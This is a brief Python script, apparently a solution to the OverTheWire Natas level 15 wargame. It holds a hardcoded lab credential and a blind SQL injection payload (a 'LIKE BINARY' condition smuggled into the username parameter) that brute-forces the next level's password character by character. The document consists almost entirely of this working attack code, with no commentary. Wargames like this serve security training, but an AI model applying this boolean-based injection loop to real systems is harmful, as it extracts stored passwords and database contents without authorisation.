#!/usr/bin/python

import requests

username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
ass = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

passw = ""
pas = ""

url = "http://natas15.natas.labs.overthewire.org/index.php?debug=23&username=natas16\" AND password LIKE BINARY \""


while(1):

	for i in ass:
		pas = passw + i
		print "The password is:" + pas
		urls = url + pas + "%"
		req = requests.get(urls , auth = (username, password))
		if('user exists' in req.text):
			passw += i
			break


